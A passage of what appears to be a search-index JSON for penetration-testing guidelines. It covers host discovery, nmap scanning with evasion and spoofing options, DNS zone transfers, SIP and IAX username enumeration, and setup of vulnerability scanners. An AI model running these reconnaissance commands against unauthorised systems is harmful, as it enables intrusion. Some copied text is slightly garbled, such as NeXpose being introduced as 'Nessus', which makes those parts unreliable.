sender of another message about a delivery problem. This can be used to assist an attacker in fingerprint the SMTP server as SMTP server information, including software and versions, may be included in a bounce message.","title":"SMTP Bounce Back"},{"location":"pentest_standard/tecguidelines/#banner-grabbing","text":"Banner Grabbing is an enumeration technique used to glean information about computer systems on a network and the services running its open ports. Banner grabbing is used to identify network the version of applications and operating system that the target host are running. Banner grabbing is usually performed on Hyper Text Transfer Protocol (HTTP), File Transfer Protocol (FTP), and Simple Mail Transfer Protocol (SMTP); ports 80, 21, and 25 respectively. Tools commonly used to perform banner grabbing are Telnet, nmap, and Netcat.","title":"Banner Grabbing"},{"location":"pentest_standard/tecguidelines/#http","text":"JUNK / HTTP/1.0 HEAD / HTTP/9.3 OPTIONS / HTTP/1.0 HEAD / HTTP/1.0","title":"HTTP"},{"location":"pentest_standard/tecguidelines/#internal-footprinting","text":"The Internal Footprinting phase of Intelligence Gathering involves gathering response results from a target based upon direct interaction from an internal perspective. The goal is to gather as much information about the target as possible.","title":"Internal Footprinting"},{"location":"pentest_standard/tecguidelines/#active-footprinting_1","text":"The active footprinting phase of Intelligence Gathering involves gathering response results from a target based upon direct interaction.","title":"Active Footprinting"},{"location":"pentest_standard/tecguidelines/#ping-sweeps","text":"Active footprinting begins with the identification of live systems. This is usually performed by conducting a Ping sweep to determine which hosts respond.","title":"Ping Sweeps"},{"location":"pentest_standard/tecguidelines/#nmap-windowslinux_1","text":"Nmap (\"Network Mapper\") is the de facto standard for network auditing/scanning. Nmap runs on both Linux and Windows. Nmap is available in both command line and GUI versions. For the sake of this document, we will only cover the command line. Nmap 5.51 ( http://nmap.org ) Usage: nmap [Scan Type(s)] [Options] {target specification} TARGET SPECIFICATION: Can pass hostnames, IP addresses, networks, etc. Ex: scanme.nmap.org, microsoft.com/24, 192.168.0.1; 10.0.0-255.1-254 -iL : Input from list of hosts/networks -iR : Choose random targets --exclude : Exclude hosts/networks --excludefile : Exclude list from file HOST DISCOVERY: -sL: List Scan - simply list targets to scan -sn: Ping Scan - disable port scan -Pn: Treat all hosts as online -- skip host discovery -PS/PA/PU/PY[portlist]: TCP SYN/ACK, UDP or SCTP discovery to given ports -PE/PP/PM: ICMP echo, timestamp, and netmask request discovery probes -PO[protocol list]: IP Protocol Ping -n/-R: Never do DNS resolution/Always resolve [default: sometimes] --dns-servers : Specify custom DNS servers --system-dns: Use OS's DNS resolver --traceroute: Trace hop path to each host SCAN TECHNIQUES: -sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans -sU: UDP Scan -sN/sF/sX: TCP Null, FIN, and Xmas scans --scanflags : Customize TCP scan flags -sI : Idle scan -sY/sZ: SCTP INIT/COOKIE-ECHO scans -sO: IP protocol scan -b : FTP bounce scan PORT SPECIFICATION AND SCAN ORDER: -p : Only scan specified ports Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9 -F: Fast mode - Scan fewer ports than the default scan -r: Scan ports consecutively - don't randomize --top-ports : Scan most common ports --port-ratio : Scan ports more common than SERVICE/VERSION DETECTION: -sV: Probe open ports to determine service/version info --version-intensity : Set from 0 (light) to 9 (try all probes) --version-light: Limit to most likely probes (intensity 2) --version-all: Try every single probe (intensity 9) --version-trace: Show detailed version scan activity (for debugging) SCRIPT SCAN: -sC: equivalent to --script#default --script# : is a comma separated list of directories, script-files or script-categories --script-args# : provide arguments to scripts --script-trace: Show all data sent and received --script-updatedb: Update the script database. OS DETECTION: -O: Enable OS detection --osscan-limit: Limit OS detection to promising targets --osscan-guess: Guess OS more aggressively TIMING AND PERFORMANCE: Options which take are in seconds, or append 'ms' (milliseconds), 's' (seconds), 'm' (minutes), or 'h' (hours) to the value (e.g. 30m). -T < 0-5>: Set timing template (higher is faster) --min-hostgroup/max-hostgroup : Parallel host scan group sizes --min-parallelism/max-parallelism : Probe parallelization --min-rtt-timeout/max-rtt-timeout/initial-rtt-timeout : Specifies probe round trip time. --max-retries : Caps number of port scan probe retransmissions. --host-timeout : Give up on target after this long --scan-delay/--max-scan-delay : Adjust delay between probes --min-rate : Send packets no slower than per second --max-rate : Send packets no faster than per second FIREWALL/IDS EVASION AND SPOOFING: -f; --mtu : fragment packets (optionally w/given MTU) -D : Cloak a scan with decoys -S : Spoof source address -e : Use specified interface -g/--source-port : Use given port number --data-length : Append random data to sent packets --ip-options : Send packets with specified ip options --ttl : Set IP time-to-live field --spoof-mac : Spoof your MAC address --badsum: Send packets with a bogus TCP/UDP/SCTP checksum OUTPUT: -oN/-oX/-oS/-oG : Output scan in normal, XML, s| : Output in the three major formats at once -v: Increase verbosity level (use -vv or more for greater effect) -d: Increase debugging level (use -dd or more for greater effect) --reason: Display the reason a port is in a particular state --open: Only show open (or possibly open) ports --packet-trace: Show all packets sent and received --iflist: Print host interfaces and routes (for debugging) --log-errors: Log errors/warnings to the normal-format output file --append-output: Append to rather than clobber specified output files --resume : Resume an aborted scan --stylesheet : XSL stylesheet to transform XML output to HTML --webxml: Reference stylesheet from Nmap.Org for more portable XML --no-stylesheet: Prevent associating of XSL stylesheet w/XML output MISC: -6: Enable IPv6 scanning -A: Enable OS detection, version detection, script scanning, and traceroute --datadir : Specify custom Nmap data file location --send-eth/--send-ip: Send using raw ethernet frames or IP packets --privileged: Assume that the user is fully privileged --unprivileged: Assume the user lacks raw socket privileges -V: Print version number -h: Print this help summary page. EXAMPLES: nmap -v -A scanme.nmap.org nmap -v -sn 192.168.0.0/16 10.0.0.0/8 nmap -v -iR 10000 -Pn -p 80 SEE THE MAN PAGE (http://nmap.org/book/man.html) FOR MORE OPTIONS AND EXAMPLES Nmap has dozens of options available. Since this section is dealing with port scanning, we will focus on the commands required to perform this task. It is important to note that the commands utilized depend mainly on the time and number of hosts being scanned. The more hosts or less time that you have to perform this tasks, the less that we will interrogate the host. This will become evident as we continue to discuss the options. To perform a ping sweep you would want to utilize the following command: nmap -sn < client ip range > / < CIDR > or < Mask > nmap -sn 10.25.0.0/24 Starting Nmap 5.51 ( http://nmap.org ) at 2011-04-22 22:58 Eastern Daylight Time Nmap scan report for 10.25.0.1 Host is up (0.0030s latency). MAC Address: C0:C1:C0:09:5C:16 (Unknown) Nmap scan report for 10.25.0.111 Host is up (0.013s latency). MAC Address: A8:E3:EE:97:3D:46 (Sony Computer Entertainment) Nmap scan report for 10.25.0.113 Host is up. Nmap scan report for 10.25.0.119 Host is up (0.018s latency). MAC Address: 00:14:6C:B4:3A:93 (Netgear) Nmap done: 256 IP addresses (4 hosts up) scanned in 6.19 seconds","title":"Nmap (Windows/Linux)"},{"location":"pentest_standard/tecguidelines/#alive6-linux","text":"Alive6, which is part of the THC IPv6 Attack Toolkit, offers the most effective mechanism for detecting all IPv6 systems. [[:File:Penetration_Testing_Execution_39.png|Screenshot Here]] Alive6 offers numerous options, but can be simply run by just specifying the interface. This returns all the IPv6 systems that are live on the local-link. [[:File:Penetration_Testing_Execution_40.png|Screenshot Here]]","title":"Alive6 (Linux)"},{"location":"pentest_standard/tecguidelines/#port-scanning_1","text":"","title":"Port Scanning"},{"location":"pentest_standard/tecguidelines/#nmap-windowslinux_2","text":"Nmap (\"Network Mapper\") is the de facto standard for network auditing/scanning. Nmap runs on both Linux and Windows. Nmap is available in both command line and GUI versions. For the sake of this document, we will only cover the command line. Nmap 5.51 ( http://nmap.org ) Usage: nmap [Scan Type(s)] [Options] {target specification} TARGET SPECIFICATION: Can pass hostnames, IP addresses, networks, etc. Ex: scanme.nmap.org, microsoft.com/24, 192.168.0.1; 10.0.0-255.1-254 -iL : Input from list of hosts/networks -iR : Choose random targets --exclude : Exclude hosts/networks --excludefile : Exclude list from file HOST DISCOVERY: -sL: List Scan - simply list targets to scan -sn: Ping Scan - disable port scan -Pn: Treat all hosts as online -- skip host discovery -PS/PA/PU/PY[portlist]: TCP SYN/ACK, UDP or SCTP discovery to given ports -PE/PP/PM: ICMP echo, timestamp, and netmask request discovery probes -PO[protocol list]: IP Protocol Ping -n/-R: Never do DNS resolution/Always resolve [default: sometimes] --dns-servers : Specify custom DNS servers --system-dns: Use OS's DNS resolver --traceroute: Trace hop path to each host SCAN TECHNIQUES: -sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans -sU: UDP Scan -sN/sF/sX: TCP Null, FIN, and Xmas scans --scanflags : Customize TCP scan flags -sI : Idle scan -sY/sZ: SCTP INIT/COOKIE-ECHO scans -sO: IP protocol scan -b : FTP bounce scan PORT SPECIFICATION AND SCAN ORDER: -p : Only scan specified ports Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9 -F: Fast mode - Scan fewer ports than the default scan -r: Scan ports consecutively - don't randomize --top-ports : Scan most common ports --port-ratio : Scan ports more common than SERVICE/VERSION DETECTION: -sV: Probe open ports to determine service/version info --version-intensity : Set from 0 (light) to 9 (try all probes) --version-light: Limit to most likely probes (intensity 2) --version-all: Try every single probe (intensity 9) --version-trace: Show detailed version scan activity (for debugging) SCRIPT SCAN: -sC: equivalent to --script#default --script# : is a comma separated list of directories, script-files or script-categories --script-args# : provide arguments to scripts --script-trace: Show all data sent and received --script-updatedb: Update the script database. OS DETECTION: -O: Enable OS detection --osscan-limit: Limit OS detection to promising targets --osscan-guess: Guess OS more aggressively TIMING AND PERFORMANCE: Options which take are in seconds, or append 'ms' (milliseconds), 's' (seconds), 'm' (minutes), or 'h' (hours) to the value (e.g. 30m). -T < 0-5>: Set timing template (higher is faster) --min-hostgroup/max-hostgroup : Parallel host scan group sizes --min-parallelism/max-parallelism : Probe parallelization --min-rtt-timeout/max-rtt-timeout/initial-rtt-timeout : Specifies probe round trip time. --max-retries : Caps number of port scan probe retransmissions. --host-timeout : Give up on target after this long --scan-delay/--max-scan-delay : Adjust delay between probes --min-rate : Send packets no slower than per second --max-rate : Send packets no faster than per second FIREWALL/IDS EVASION AND SPOOFING: -f; --mtu : fragment packets (optionally w/given MTU) -D : Cloak a scan with decoys -S : Spoof source address -e : Use specified interface -g/--source-port : Use given port number --data-length : Append random data to sent packets --ip-options : Send packets with specified ip options --ttl : Set IP time-to-live field --spoof-mac : Spoof your MAC address --badsum: Send packets with a bogus TCP/UDP/SCTP checksum OUTPUT: -oN/-oX/-oS/-oG : Output scan in normal, XML, s| : Output in the three major formats at once -v: Increase verbosity level (use -vv or more for greater effect) -d: Increase debugging level (use -dd or more for greater effect) --reason: Display the reason a port is in a particular state --open: Only show open (or possibly open) ports --packet-trace: Show all packets sent and received --iflist: Print host interfaces and routes (for debugging) --log-errors: Log errors/warnings to the normal-format output file --append-output: Append to rather than clobber specified output files --resume : Resume an aborted scan --stylesheet : XSL stylesheet to transform XML output to HTML --webxml: Reference stylesheet from Nmap.Org for more portable XML --no-stylesheet: Prevent associating of XSL stylesheet w/XML output MISC: -6: Enable IPv6 scanning -A: Enable OS detection, version detection, script scanning, and traceroute --datadir : Specify custom Nmap data file location --send-eth/--send-ip: Send using raw ethernet frames or IP packets --privileged: Assume that the user is fully privileged --unprivileged: Assume the user lacks raw socket privileges -V: Print version number -h: Print this help summary page. EXAMPLES: nmap -v -A scanme.nmap.org nmap -v -sn 192.168.0.0/16 10.0.0.0/8 nmap -v -iR 10000 -Pn -p 80 SEE THE MAN PAGE (http://nmap.org/book/man.html) FOR MORE OPTIONS AND EXAMPLES Nmap has dozens of options available. Since this section is dealing with port scanning, we will focus on the commands required to perform this task. It is important to note that the commands utilized depend mainly on the time and number of hosts being scanned. The more hosts or less time that you have to perform this tasks, the less that we will interrogate the host. This will become evident as we continue to discuss the options. Based on IP set being assessed, you would want to scan the both TCP and UDP across port range to 1-65535. The command that will be utilized is as follows: nmap -A -PN -sU -sS -T2 -v -p 1-65535 < client ip range > / < CIDR > or < Mask > -oA NMap_FULL_ < client ip range > nmap -A -PN -sU -sS -T2 -v -p 1-65535 client.com -oA NMap_FULL_client Starting Nmap 5.51 ( http://nmap.org ) at 2011-04-22 22:27 Eastern Daylight Time NSE: Loaded 57 scripts for scanning. Initiating Parallel DNS resolution of 1 host. at 22:27 Completed Parallel DNS resolution of 1 host. at 22:27, 0.10s elapsed Initiating SYN Stealth Scan at 22:27 Scanning client.com (74.117.116.73) [65535 ports] Discovered open port 80/tcp on 74.117.116.73 On large IP sets, those greater than 100 IP addresses do not specify a port range. The command that will be utilized is as follows: nmap -A -O -PN < client ip range > / < CIDR > or < Mask > -oA NMap_ < client ip range > nmap -A -O -PN client.com -oA NMap_client Starting Nmap 5.51 ( http://nmap.org ) at 2011-04-22 22:37 Eastern Daylight Time Nmap scan report for client.com (74.117.116.73) Host is up (0.13s latency). rDNS record for 74.117.116.73: 74-117-116-73.parked.com Not shown: 999 filtered ports PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.2.3 ((CentOS)) | http-robots.txt: 2 disallowed entries |_/click.php /ud.php |_http-title: client.com |_http-methods: No Allow or Public header in OPTIONS response (status code 200) |_http-favicon: Parked.com domain parking Warning: OSScan results may be unreliable because we could not find at least 1 o pen and 1 closed port Device type: general purpose Running (JUST GUESSING): Linux 2.6.X (92%), OpenBSD 4.X (88%), FreeBSD 6.X (88%) It should be noted that Nmap has limited options for IPv6. These include TCP connect (-sT), Ping scan (-sn), List scan (-sL) and version detection. nmap -6 -sT -P0 fe80::80a5:26f2:8db7:5d04%12 Starting Nmap 5.51 ( http://nmap.org ) at 2011-04-22 22:42 Eastern Daylight Time Nmap scan report for lancelot (fe80::80a5:26f2:8db7:5d04) Host is up (1.0s latency). Not shown: 988 closed ports PORT STATE SERVICE 135/tcp open msrpc 445/tcp open microsoft-ds 554/tcp open rtsp 2869/tcp open icslap 3389/tcp open ms-term-serv 5000/tcp open upnp 5001/tcp open commplex-link 5002/tcp open rfe 5003/tcp open filemaker 5004/tcp open avt-profile-1 5357/tcp open wsdapi 10243/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 287.05 seconds","title":"Nmap (Windows/Linux)"},{"location":"pentest_standard/tecguidelines/#snmp-sweeps_1","text":"SNMP sweeps are performed too as they offer tons of information about a specific system. The SNMP protocol is a stateless, datagram oriented protocol. Unfortunately SNMP servers don't respond to requests with invalid community strings and the underlying UDP protocol does not reliably report closed UDP ports. This means that \"no response\" from a probed IP address can mean either of the following: Machine unreachable SNMP server not running invalid community string the response datagram has not yet arrived","title":"SNMP Sweeps"},{"location":"pentest_standard/tecguidelines/#snmpenum-linux_1","text":"SNMPEnum is a perl script that sends SNMP requests to a single host, then waits for the response to come back and logs them. [[:File:Penetration_Testing_Execution_45.png|Screenshot Here]]","title":"SNMPEnum (Linux)"},{"location":"pentest_standard/tecguidelines/#metasploit","text":"Active footprinting can also be performed to a certain extent through Metasploit. Please refer to the [ http://www.offensive-security.com/metasploit-unleashed/Information_Gathering Metasploit Unleashed] course for more information on this subject.","title":"Metasploit"},{"location":"pentest_standard/tecguidelines/#zone-transfers_1","text":"DNS zone transfer, also known as AXFR, is a type of DNS transaction. It is a mechanism designed to replicate the databases containing the DNS data across a set of DNS servers. Zone transfer comes in two flavors, full (AXFR) and incremental (IXFR). There are numerous tools available to test the ability to perform a DNS zone transfer. Tools commonly used to perform zone transfers are host, dig and nmap.","title":"Zone Transfers"},{"location":"pentest_standard/tecguidelines/#host_1","text":"host < domain > < DNS server >","title":"Host"},{"location":"pentest_standard/tecguidelines/#dig_1","text":"dig @server domain axfr","title":"Dig"},{"location":"pentest_standard/tecguidelines/#smtp-bounce-back_1","text":"SMTP bounce back, also called a Non-Delivery Report/Receipt (NDR), a (failed) Delivery Status Notification (DSN) message, a Non-Delivery Notification (NDN) or simply a bounce, is an automated electronic mail message from a mail system informing the sender of another message about a delivery problem. This can be used to assist an attacker in fingerprint the SMTP server as SMTP server information, including software and versions, may be included in a bounce message.","title":"SMTP Bounce Back"},{"location":"pentest_standard/tecguidelines/#reverse-dns_1","text":"Reverse DNS can be used to obtain valid server names in use within an organizational. There is a caveat that it must have a PTR (reverse) DNS record for it to resolve a name from a provided IP address. If it does resolve then the results are returned. This is usually performed by testing the server with various IP addresses to see if it returns any results.","title":"Reverse DNS"},{"location":"pentest_standard/tecguidelines/#banner-grabbing_1","text":"Banner Grabbing is an enumeration technique used to glean information about computer systems on a network and the services running its open ports. Banner grabbing is used to identify network the version of applications and operating system that the target host are running. Banner grabbing is usually performed on Hyper Text Transfer Protocol (HTTP), File Transfer Protocol (FTP), and Simple Mail Transfer Protocol (SMTP); ports 80, 21, and 25 respectively. Tools commonly used to perform banner grabbing are Telnet, nmap, netcat and netca6 (IPv6).","title":"Banner Grabbing"},{"location":"pentest_standard/tecguidelines/#http_1","text":"JUNK / HTTP/1.0 HEAD / HTTP/9.3 OPTIONS / HTTP/1.0 HEAD / HTTP/1.0","title":"HTTP"},{"location":"pentest_standard/tecguidelines/#httprint","text":"httprint is a web server fingerprinting tool. It relies on web server characteristics to accurately identify web servers, despite the fact that they may have been obfuscated by changing the server banner strings, or by plug-ins such as mod_security or servermask. httprint can also be used to detect web enabled devices which do not have a server banner string, such as wireless access points, routers, switches, cable modems, etc. httprint uses text signature strings and it is very easy to add signatures to the signature database. [[:File:Penetration_Testing_Execution_46.png|Screenshot Here]]","title":"httprint"},{"location":"pentest_standard/tecguidelines/#voip-mapping","text":"VoIP mapping is where we gather information about the topology, the servers and the clients. The main goal here is to find live hosts, PBX type and version, VoIP servers/gateways, clients (hardware and software) types and versions. The majority of techniques covered here assume a basic understanding of the ''Session Initiation Protocol (SIP''). There are several tools available to help us identify and enumerate VoIP enabled devices. SMAP is a tool which is specifically designed to scan for SIP enabled devices by generating SIP requests and awaiting responses. SMAP usage is as follows: [[:File:Penetration_Testing_Execution_47.png|Screenshot Here]] SIPScan is another scanner for sip enabled devices that can scan a single host or an entire subnet. [[:File:Penetration_Testing_Execution_48.png|Screenshot Here]]","title":"VoIP mapping"},{"location":"pentest_standard/tecguidelines/#extensions","text":"Extensions are any client application or device that initiates a SIP connection, such as an IP phone, PC softphone, PC instant messaging client, or mobile device. The goal is to identify valid usernames or extensions of SIP devices. Enumerating extensions is usually a product of the error messages returned using the SIP method: REGISTER, OPTIONS, or INVITE. There are many tools that can be utilized to enumerate SIP devices. A tool that can be used to enumerate extensions is Svwar from the SIPVicious suite.","title":"Extensions"},{"location":"pentest_standard/tecguidelines/#svwar","text":"Svwar is also a tool from the sipvicious suite allows to enumerate extensions by using a range of extensions or using a dictionary file svwar supports all the of the three extension enumeration methods as mentioned above, the default method for enumeration is REGISTER. Svwar usage is as follows: [[:File:Penetration_Testing_Execution_49.png|Screenshot Here]]","title":"Svwar"},{"location":"pentest_standard/tecguidelines/#enumiax","text":"If you ' ve identified an Asterisk server is in use, you need to utilize a username guessing tool such as enumIAX to enumerate Asterisk Exchange protocol usernames. enumIAX is an Inter Asterisk Exchange version 2 (IAX2) protocol username brute-force enumerator. enumIAX may operate in two distinct modes; Sequential Username Guessing or Dictionary Attack. enumIAX usage is as follows: [[:File:Penetration_Testing_Execution_50.png|Screenshot Here]]","title":"enumIAX"},{"location":"pentest_standard/tecguidelines/#passive-reconnaissance_1","text":"","title":"Passive Reconnaissance"},{"location":"pentest_standard/tecguidelines/#packet-sniffing","text":"Performing packet sniffing allows for the collection IP addresses and MAC addresses from systems that have packet traffic in the stream being analyzed. For the most part, packet sniffing is difficult to detect and so this form of recon is essentially passive and quite stealthy. By collecting and analyzing a large number of packets it becomes possible to fingerprint the operating system and the services that are running on a given device. It may also be possible to grab login information, password hashes, and other credentials from the packet stream. Telnet and older versions of SNMP pass credentials in plain text and are easily compromised with sniffing. Packet sniffing can also be useful in determining which servers act as critical infrastructure and therefore are of interest to an attacker.","title":"Packet Sniffing"},{"location":"pentest_standard/tecguidelines/#vulnerability-analysis","text":"Vulnerability Analysis is used to identify and evaluate the security risks posed by identified vulnerabilities. Vulnerability analysis work is divided into two areas: Identification and validation. Vulnerability discovery effort is the key component of the Identification phase. Validation is reducing the number of identified vulnerabilities to only those that are actually valid.","title":"Vulnerability Analysis"},{"location":"pentest_standard/tecguidelines/#vulnerability-testing","text":"Vulnerability Testing is divided to include both an Active and Passive method.","title":"Vulnerability Testing"},{"location":"pentest_standard/tecguidelines/#active","text":"","title":"Active"},{"location":"pentest_standard/tecguidelines/#automated-tools","text":"An automated scanner is designed to assess networks, hosts, and associated applications. There are a number of types of automated scanners available today, some focus on particular targets or types of targets. The core purpose of an automated scanner is the enumeration of vulnerabilities present on networks, hosts, and associated applications.","title":"Automated Tools"},{"location":"pentest_standard/tecguidelines/#networkgeneral-vulnerability-scanners","text":"","title":"Network/General Vulnerability Scanners"},{"location":"pentest_standard/tecguidelines/#open-vulnerability-assessment-system-openvas-linux","text":"The Open Vulnerability Assessment System (OpenVAS) is a framework of several services and tools offering a comprehensive and powerful vulnerability scanning and vulnerability management solution. OpenVAS is a fork of Nessus that allows free development of a non-proprietary tool. Like the earlier versions of Nessus, OpenVAS consists of a Client and Scanner. To start the Scanner, simply run openvassd from the command line. [[:File:Penetration_Testing_Execution_51.png|Screenshot Here]] There are two ways in which you can run the OpenVAS Client, either the GUI or the command line interface. Using the menu you would select on OpenVAS Client. In the console it is \"OpenVAS-Client.\" [[:File:Penetration_Testing_Execution_52.png|Screenshot Here]] Once the client starts up you will need to connect it to the scanner. [[:File:Penetration_Testing_Execution_53.png|Screenshot Here]] Submit in the supplied user credentials. [[:File:Penetration_Testing_Execution_54.png|Screenshot Here]] If you created a certificate then you supply it as well. You will then be presented with a certificate to accept. Click yes to continue. [[:File:Penetration_Testing_Execution_55.png|Screenshot Here]] Once you accept the certificate, OpenVAS will initialize and indicate the number of Found and Enabled plugins. This could take a while depending upon the number of plugins that need to be downloaded. Also, you need to ensure that you've added the appropriate /etc/hosts entries for both the IPv4 and IPv6 address. For example: 127.0.0.1 localhost 127.0.0.1 pentest # The following lines are desirable for IPv6 capable hosts : :1 ip6-localhost ip6-loopback pentest localhost [[:File:Penetration_Testing_Execution_56.png|Screenshot Here]] Before scanning anything we need to configure the OpenVAS Scan Options. The General section covers all the general scan options. See Appendix A for the specific settings. To start a new scan, you use the Scan Assistant. [[:File:Penetration_Testing_Execution_57.png|Screenshot Here]] Once the Scan Assistant launches, you'll have to provide some information to create the task. First, you'll need to give the name of the task. This is usually the name of the client or some other name that describes what you're scanning. Once you've completed this, click Forward to continue. [[:File:Penetration_Testing_Execution_58.png|Screenshot Here]] A scope can be seen as a sub-task. It defines a certain scan and the title should indicate the scope of the scan such as \"Internet Facing Systems\" or \"Aggressive Scan of Client X\". Once you've completed this, click Forward to continue. [[:File:Penetration_Testing_Execution_59.png|Screenshot Here]] At this point you'll need to provide the target information. This can be in the form of a hostname, FQDN, IP Address, Network Range, CIDR. The only requirement is that they have to be separated with commas. Once you've completed this, click Forward to continue. [[:File:Penetration_Testing_Execution_60.png|Screenshot Here]] Finally, we're at the point where we can launch our scan. Click Execute to start the scan. [[:File:Penetration_Testing_Execution_61.png|Screenshot Here]] [[:File:Penetration_Testing_Execution_62.png|Screenshot Here]] [[:File:Penetration_Testing_Execution_63.png|Screenshot Here]] [[:File:Penetration_Testing_Execution_64.png|Screenshot Here]]","title":"Open Vulnerability Assessment System (OpenVAS)  (Linux)"},{"location":"pentest_standard/tecguidelines/#nessus-windowslinux","text":"Nessus is a commercial automated scanning program. It is designed to detect potential vulnerabilities on the networks, hosts, and associated application being assessed. Nessus allows for custom policies to be utilized for specific evaluations. For non-Web applications, the policy that should be utilized is the \"Only Safe Checks\" policy (See Appendix A). For Web applications, the policy that should be utilized is the \"Only Safe Checks (Web)\" policy (See Appendix B). To access Nessus simply enter in the correct URL into a web browser. If you are accessing from the Pentest Lab use the following URL: https:// < IP ADDRESS > :8834. ''' [[:File:Penetration_Testing_Execution_65.png|Screenshot Here]] ''' The credentials to access this will need to be established prior to attempting to access. Once you have the logged in, you will be presented with the Reports Interface. Prior to running any Nessus scan, the product should be validated to ensure that it has been properly updated with the latest signatures. This process is normally run as part of a scheduled task, but you can run click on \"About\" which will present the Windows which contains data about the installation. [[:File:Penetration_Testing_Execution_66.png|Screenshot Here]] The Client Build ID is quick way to ensure that Nessus has been updated. The format is as simple as YYYYMMDD. 201110223 would mean that the scanner was last updated on February, 23, 2011. [[:File:Penetration_Testing_Execution_67.png|Screenshot Here]] If the scanner has been updated within the last week, you can safely conduct scans. If this date is further out than one week, you should immediately report this and avoid using the scanner until Nessus has been updated. Within Nessus, there are four main tabs available: Reports, Scans, Policies, and Users. ''' [[:File:Penetration_Testing_Execution_68.png|Screenshot Here]] ''' To initiate a scan utilize the Scan tab. This will present you with several additional options such as Add, Edit, Browse, Launch, Pause, Stop, and Delete. [[:File:Penetration_Testing_Execution_69.png|Screenshot Here]] You will create a new scan by clicking on the \"Scans\" option on the menu bar at the top and then click on the \" + Add\" button on the right. The \"Add Scan\" screen will be displayed as follows: ''' [[:File:Penetration_Testing_Execution_70.png|Screenshot Here]] ''' There are five fields to enter before starting a scan. The name field is set to the name that will be displayed to identify the scan. The type field allows you to choose between \"Run Now\" and \"Template.\" \"Run Now\" executes the scan immediately after submitting. \"Template\" saves the scan as a template for repeated scans. The policy field is where the scan policy is selected. The final two fields are both related to the scan targets. You can either enter in the hosts (one per line) or browse for a text file containing all the target hosts. Once all these fields have been properly populated click \"Launch Scan\" to initiate the scan process. ''Note:'' Automated tools can sometimes be too aggressive by default and need to be scaled back if the customer is affected. A validation scan should be conducted weekly against < IP ADDRESS > using the \"Validation Scan\" policy (See Appendix C) to ensure that Nessus is performing scans in properly. [[:File:Penetration_Testing_Execution_71.png|Screenshot Here]] If you conduct a \"Validation Scan\" and do not receive similar results, then you should immediately report this and void using the scanner. Once the scan has completed running, it will be visible in the Reports tab. To open the scan reports simply double-click on the appropriate completed scan file. This will provide us with some information about the scan as well as the results. ''' [[:File:Penetration_Testing_Execution_72.png|Screenshot Here]] ''' We need to save this report for us to analyze. To do this, click on the \"Download Report.\" This will present a new window that allows for the format to be specified. ''' [[:File:Penetration_Testing_Execution_73.png|Screenshot Here]] ''' The default format is \".nessus\", however it is necessary to download the Nessus results in HTML format. This allows you to quickly review the vulnerabilities.","title":"Nessus (Windows/Linux)"},{"location":"pentest_standard/tecguidelines/#nexpose","text":"Nessus is a commercial automated scanning product that provides vulnerability management, policy compliance and remediation management. It is designed to detect vulnerabilities as well as policy compliance on the networks, hosts, and associated web applications. To access NeXpose simply enter in the correct URL into a web browser. If you are accessing from the Pentest Lab use the following URL: https:// < IP ADDRESS > :3780/login.html. [[:File:Penetration_Testing_Execution_74.png|Screenshot Here]] The credentials to access this will need to be established prior to attempting to access. Once you have the logged in, you will be presented with the dashboard Interface. [[:File:Penetration_Testing_Execution_75.png|Screenshot Here]] Prior to running any NeXpose scan, the product should be validated to ensure that it has been properly updated with the latest signatures. This process is normally run as part of a scheduled task, but you can quickly validate that it the scanner is up to date by simply viewing the 'News' which will give you a log file of all the updates to the scan engine as well as any updated checks. [[:File:Penetration_Testing_Execution_76.png|Screenshot Here]] If the scanner has been updated within the last week, you can safely conduct scans. If this date is further out than one week, you should immediately report this and void using the scanner until NeXpose has been updated. Within NeXpose, there are six main tabs available: Home, Assets, Tickets, Reports, Vulnerabilities, and Administration. ''' [[:File:Penetration_Testing_Execution_77.png|Screenshot Here]] ''' To initiate a scan you will have to setup a 'New Site'. To perform this click on the 'New Site' button at the bottom of the Home Page or click on the Assets tab. [[:File:Penetration_Testing_Execution_78.png|Screenshot Here]] This will present you with the 'Site Configuration - General' page which contains several inputs such as Site name, Site importance, and Site Description. [[:File:Penetration_Testing_Execution_79.png|Screenshot Here]] Type a name for the target site. Then add a brief description for the site, and select a level of importance from the dropdown list. The importance level corresponds to a risk factor that NeXpose uses to calculate a risk index for each site. The 'Very Low' setting reduces a risk index to \u2153 of its initial value. The 'Low' setting reduces the risk index to \u2154 of its initial value. 'High' and 'Very High' settings increase the risk index to 2x and 3x times its initial value, respectively. A 'Normal' setting does not change the risk index. ''' [[:File:Penetration_Testing_Execution_80.png|Screenshot Here]] ''' Go to the ''Devices ''page to list assets for your new site. IP addresses and/or hostnames can be manually entered in the text box labeled ''Dev''i''ces to scan''. It is also possible to import a comma separated file that lists IP address and/or the host names of targets you want to scan. You do have to ensure that each address/hostname in the file appears on its own line. To import a target list file, click the Browse''' '''button in the '''Included Device's' ''area, and select the appropriate file. If you need to exclude targets from a scan, the process is the sample however; it is performed under the area labeled '''Devices to Exclude'.'' Once the targets have been added, a scan template will need to be selected from the '''Scan Setup' ''page. To select a scan template simply browse the available templates. The scan engine drop down allows you to choose between the local scan engine and the Rapid 7 hosted scan engine. [[:File:Penetration_Testing_Execution_81.png|Screenshot Here]] There are many templates available, however be aware that if you modify a template, all sites that use that scan template will use these modified settings. So ensure that modify an existing template with caution. The default scan templates Denial of Service, Discovery scan, Discovery scan (aggressive), Exhaustive, Full audit, Internal DMZ audit, Linux RPMs, Microsoft hotfix, Payment Card Industry (PCI) audit, Penetration test, Safe network audit, Sarbanes-Oxley (SOX) compliance, SCADA audit, and Web audit. Specific settings for these templates are included in Appendix D Finally, if you wish to schedule a scan to run automatically, click the check box labeled 'Enable schedule'. The console displays options for a start date and time, maximum scan duration in minutes, and frequency of repetition. If the scheduled scan runs and exceeds the maximum specified duration, it will pause for an interval that you specify in the option labeled 'Repeat every'. Select an option for what you want the scan to do after the pause interval. The newly scheduled scan will appear in the 'Next Scan' column of the 'Site Summary' pane of the page for the site that you are creating. All scheduled scans appear on the 'Calendar' page, which you can view by clicking the 'Monthly calendar' link on the 'Administration' page. You can set up alerts to inform you when a scan starts, stops, fails, or matches a specific criterion. From the '''Alerting; ''page and click the ''''New Alert' '''button. [[:File:Penetration_Testing_Execution_82.png|Screenshot Here]] The console displays a '''New Alert' ''dialog box. Click the ''''Enable alert' '''check box to ensure that NeXpose generates this type of alert. 